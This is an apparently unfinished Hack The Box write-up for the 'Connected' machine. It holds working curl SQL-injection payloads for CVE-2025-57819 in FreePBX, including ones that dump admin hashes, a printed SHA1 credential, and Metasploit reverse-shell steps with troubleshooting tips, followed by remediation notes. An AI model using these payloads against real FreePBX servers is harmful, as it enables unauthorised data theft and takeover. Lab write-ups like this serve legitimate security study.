# HTB — Connected

**Platform:** Hack The Box
**Machine:** Connected
**OS:** Linux (CentOS)
**Difficulty:** Easy
**Target IP:** 10.129.136.83
**Status:** In progress — user flag obtained, privilege escalation pending

---

## Summary

Foothold on this box comes from an outdated **FreePBX 16.0.40.7** instance
exposed over HTTP/HTTPS. It is vulnerable to **CVE-2025-57819**, an
unauthenticated SQL injection in the `brand` parameter of the endpoint
module's AJAX handler. The injection is first used error-based to leak the
FreePBX admin credential hash, and then leveraged (via the Metasploit module)
into unauthenticated remote code execution, returning a reverse shell as the
`asterisk` service user and the user flag. Privilege escalation to root is
still outstanding.

**Attack chain (so far):** FreePBX fingerprint → CVE-2025-57819 unauth SQLi
(`brand` param) → admin hash leak → `freepbx_unauth_sqli_to_rce` → reverse
shell as `asterisk` → user flag → *(privesc: TODO)*.

---

## 1. Reconnaissance

### Nmap

```bash
nmap -sV 10.129.136.83
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
```

**Observations:**

- **22/tcp — SSH (OpenSSH 7.4):** Standard access route if credentials can
  be obtained. 7.4 points at a CentOS 7-era host.
- **80/443 — HTTP/HTTPS (Apache 2.4.6, CentOS, PHP 7.4.16):** The CentOS +
  Apache 2.4.6 + PHP stack is classic CentOS 7. PHP presence means a dynamic
  web app is worth enumerating.

---

## 2. Enumeration — Web Application

Browsing the web application reveals it is running **FreePBX 16.0.40.7**
(a web GUI for the Asterisk PBX). This version is vulnerable to
**CVE-2025-57819** — an unauthenticated SQL injection in the `brand`
parameter of the endpoint module's AJAX endpoint that can be chained to
remote code execution.

- PoC reference:
  `github.com/MuhammadWaseem29/SQL-Injection-and-RCE_CVE-2025-57819`
- Vendor advisory: FreePBX `security-reporting` GHSA-m42g-xg4c-5f3h

**Injection point:**

```
/admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model&brand=<INJECT>
```

### Confirming the injection (error-based)

An error-based payload using `EXTRACTVALUE` leaks `USER()`, confirming the
SQL injection fires:

```bash
curl -i -k "https://10.129.136.83/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~USER:',(SELECT+USER()),'~'))+--+"
```

---

## 3. Credential Extraction (SQLi → admin hash)

FreePBX stores admin logins in the `ampusers` table (`username`,
`password_sha1`) of the `asterisk` database. The same error-based injection
is reused to pull them out.

**Gotcha:** `EXTRACTVALUE` truncates its output at **32 characters**, while a
SHA1 hash is **40 hex characters**, so the hash is extracted in two pieces
with `SUBSTRING` and concatenated afterward.

```bash
# username
curl -sk "https://10.129.136.83/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~',(SELECT+username+FROM+ampusers+LIMIT+1),'~'))+--+"

# hash, chars 1-31
curl -sk "https://10.129.136.83/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~',(SELECT+SUBSTRING(password_sha1,1,31)+FROM+ampusers+LIMIT+1),'~'))+--+"

# hash, chars 31-40
curl -sk "https://10.129.136.83/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~',(SELECT+SUBSTRING(password_sha1,31,10)+FROM+ampusers+LIMIT+1),'~'))+--+"
```

**Credential recovered:**

```
admin : 05c689686a4fad5ce3ec76e7ae5708b1fe2da43a   (raw-sha1)
```

> Cracking attempt with John (`--format=raw-sha1`, rockyou) was set up but not
> completed — the reverse-shell path below made cracking unnecessary for the
> foothold.

---

## 4. Foothold — CVE-2025-57819 RCE (Metasploit)

Rather than crack the hash and use the authenticated path, the public
Metasploit module was used to turn the same SQLi into a shell:

```
msf > use exploit/unix/http/freepbx_unauth_sqli_to_rce
msf > set RHOSTS 10.129.136.83
msf > set LHOST 10.10.14.76
msf > set LPORT 4444
msf > run
```

The module injects a **cronjob** via the SQLi, then waits for cron to tick
and trigger the reverse shell.

### Troubleshooting the "no session" result

First run completed but returned no session:

```
[+] Created cronjob with job name: 'puhyS'
[*] Waiting for cronjob to trigger...
[+] Cronjob removed, happy hacking!
[*] Exploit completed, but no session was created.
```

**Root cause:** the local (attacker-side) firewall was blocking **incoming**
connections, so the target's reverse callback to port 4444 never reached the
Metasploit handler.

**Fix:** allowed inbound on port **4444** from the `tun0` (HTB VPN) interface,
then re-ran the module → **session created**.

> Other things checked / worth remembering for this module: confirm `LHOST`
> matches the current `tun0` IP (HTB IPs rotate), the cron trigger is timing
> dependent so re-running helps, and egress filtering can block high ports
> (trying `LPORT 443` is a good fallback).

Landed as the **asterisk** service user:

```
id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```

**User flag:**

```bash
cat /home/asterisk/user.txt
```

```
user.txt: [REDACTED]
```

---

## 5. Privilege Escalation — TODO (resume here tomorrow)

Shell obtained as `asterisk` (uid 999). Escalation to root not yet started.

**Next steps to try:**

```bash
sudo -l                                   # asterisk often has sudo rights on PBX boxes (fwconsole/asterisk)
getcap -r / 2>/dev/null                   # file capabilities
find / -perm -4000 -type f 2>/dev/null    # SUID binaries
# enumerate FreePBX/Asterisk configs for creds (e.g. /etc/amportal.conf,
#   /etc/freepbx.conf, /etc/asterisk/*) — DB/root password reuse is common
# check running services / cron / internal listeners; consider linpeas
```

---

## 6. Loot

| Type        | Value                                                  |
|-------------|--------------------------------------------------------|
| Software    | FreePBX 16.0.40.7 (CVE-2025-57819)                     |
| Credentials | `admin : 05c689686a4fad5ce3ec76e7ae5708b1fe2da43a` (raw-sha1) |
| User flag   | `[REDACTED]` (`/home/asterisk/user.txt`)              |
| Root flag   | *pending*                                              |

---

## 7. Remediation Notes

- **Patch FreePBX:** Upgrade past the fixed release for CVE-2025-57819; the
  endpoint module's `brand` parameter must be parameterized/sanitized to stop
  the SQL injection.
- **Restrict the admin interface:** The FreePBX/Asterisk web GUI should not be
  internet-facing. Limit `/admin/` to a management VPN or allowlisted IPs.
- **Monitor for the injection pattern:** Alert on requests to `admin/ajax.php`
  with `module=FreePBX...endpoint` and SQL-ish content (`EXTRACTVALUE`,
  `UNION`, `SUBSTRING`, quotes, `--`).
- **Credential hygiene:** Rotate the FreePBX admin password and database
  credentials after patching; store password hashes with a modern,
  salted algorithm rather than raw SHA1.
- **Least privilege for the service account:** Ensure the `asterisk` user has
  no unnecessary `sudo`/capability grants that would allow trivial escalation
  from a web-app RCE.

---

## Session Log (chronological)

1. `nmap -sV` → 22/80/443, CentOS + Apache 2.4.6 + PHP 7.4.16.
2. Web app fingerprinted as FreePBX 16.0.40.7 → CVE-2025-57819.
3. Confirmed error-based SQLi on `brand` param (leaked `USER()`).
4. Dumped `admin` SHA1 hash from `ampusers` via `SUBSTRING` split.
5. Switched to Metasploit `freepbx_unauth_sqli_to_rce`.
6. First run: cronjob planted, no session — local firewall blocked inbound 4444.
7. Opened inbound 4444 to tun0 → reverse shell as `asterisk`.
8. Read user flag at `/home/asterisk/user.txt`.
9. **STOPPED HERE** — privilege escalation to root still to do.
